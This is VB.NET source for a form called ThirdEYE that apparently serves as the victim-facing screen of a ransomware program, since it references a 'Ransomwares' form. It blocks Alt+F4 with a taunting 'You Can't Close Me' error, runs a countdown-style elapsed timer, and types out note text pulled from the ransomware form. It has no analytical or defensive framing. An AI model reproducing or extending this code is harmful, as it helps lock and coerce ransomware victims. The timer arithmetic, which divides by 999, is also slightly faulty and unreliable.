Public Class ThirdEYE
    Dim Rens As Ransomwares = New Ransomwares
    Private CompTime As System.Int32
    Sub TypingText(ByVal Word As String)
        Static NextChar As Integer
        Dim Length As Integer
        Dim Display As String
        NextChar = NextChar + 1
        Length = Length + 1
        Display = Mid$(Word, NextChar, Length)
        Label5.Text = Label5.Text & Display
    End Sub
    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click
        ' Label2.Text = GetHour()
    End Sub

    Private Sub ThirdEYE_Load(sender As Object, e As EventArgs) Handles Me.Load

    End Sub

    Private Sub ThirdEYE_KeyDown(sender As Object, e As KeyEventArgs) Handles Me.KeyDown
        If e.KeyData = Keys.Alt + Keys.F4 Then
            MessageBox.Show("Lol!!!😅 😆 😄 You Can't Close Me", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            e.Handled = True
        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim CurTickValue As System.Int32 = Environment.TickCount
        Dim Difference As System.Int32 = CurTickValue - CompTime

        Dim Days As System.Int32
        Dim Hours As System.Int32
        Dim Minutes As System.Int32
        Dim Seconds As System.Int32

        Days = (Difference / (86400 * 999)) Mod 365
        Hours = (Difference / (3600 * 999)) Mod 24
        Minutes = (Difference / (60 * 999)) Mod 60
        Seconds = (Difference / 999) Mod 60

        Label1.Text = String.Format("{0} Days, {1} hours, {2} minutes {3} seconds",
                                CStr(Days),
                                CStr(Hours),
                                CStr(Minutes),
                                CStr(Seconds))
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        If Rens.CheckBox2.Checked = True Then
            TypingText(Rens.RichTextBox1.Text)
        End If
    End Sub
End Class